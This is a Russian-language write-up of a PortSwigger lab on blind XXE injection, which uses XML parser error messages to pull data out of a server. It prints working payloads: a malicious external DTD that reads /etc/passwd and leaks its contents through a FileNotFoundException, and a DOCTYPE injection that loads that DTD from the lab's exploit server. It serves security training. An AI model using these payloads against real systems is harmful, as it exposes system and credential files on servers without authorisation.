# Exploiting blind XXE to retrieve data via error messages

## Theory

<h3>Использование слепого XXE для извлечения данных через сообщения об ошибках</h3>

Альтернативным подходом к использованию слепого XXE является инициирование ошибки синтаксического анализа XML, когда сообщение об ошибке содержит конфиденциальные данные, которые вы хотите получить. Это будет эффективно, если приложение вернет результирующее сообщение об ошибке в своем ответе.

Вы можете вызвать сообщение об ошибке синтаксического анализа XML, содержащее содержимое файла /etc/passwd, с помощью вредоносного внешнего DTD следующим образом:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Это DTD выполняет следующие шаги:

* Определяет сущность параметра XML, называемую файлом, содержащую содержимое файла /etc/passwd.
* Определяет сущность параметра XML с именем eval, содержащую динамическое объявление другой сущности параметра XML с именем error. Сущность ошибки будет оцениваться путем загрузки несуществующего файла, имя которого содержит значение сущности файла.
* Использует сущность eval, которая вызывает выполнение динамического объявления сущности ошибки.
* Использует объект ошибки, так что его значение оценивается при попытке загрузить несуществующий файл, что приводит к сообщению об ошибке, содержащему имя несуществующего файла, который является содержимым файла /etc/passwd.

Вызов вредоносного внешнего DTD приведет к появлению сообщения об ошибке, подобного следующему:
```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

## Writeup

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_blind_XXE_to_retrieve_data_via_error_messages/assets/1.png)

Выберем любой продукт.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_blind_XXE_to_retrieve_data_via_error_messages/assets/2.png)

Перейдем на его страницу и спустимся в самый низ.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_blind_XXE_to_retrieve_data_via_error_messages/assets/3.png)

Нажмем на кнопку "Check stock" и перехватим запрос. Отправляем его в Repeater.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_blind_XXE_to_retrieve_data_via_error_messages/assets/4.png)

У нас есть подготовленный exploit server. Перейдем к нему.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_blind_XXE_to_retrieve_data_via_error_messages/assets/5.png)

В поле Body впишем наш эксплоит, который будет вызываться с помощью XXE. Код эксплоита:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_blind_XXE_to_retrieve_data_via_error_messages/assets/6.png)

Затем скопируем URL-адрес ведущий на наш эксплоит.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_blind_XXE_to_retrieve_data_via_error_messages/assets/7.png)

Модифицируем запрос. Вставляем скопированный URL-адрес. Отправляем запрос. Код экплоита:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a860065037c3f30c0d761b401850080.web-security-academy.net/exploit"> %xxe;]>
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_blind_XXE_to_retrieve_data_via_error_messages/assets/8.png)

Получаем ответ от сервера.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_blind_XXE_to_retrieve_data_via_error_messages/assets/9.png)
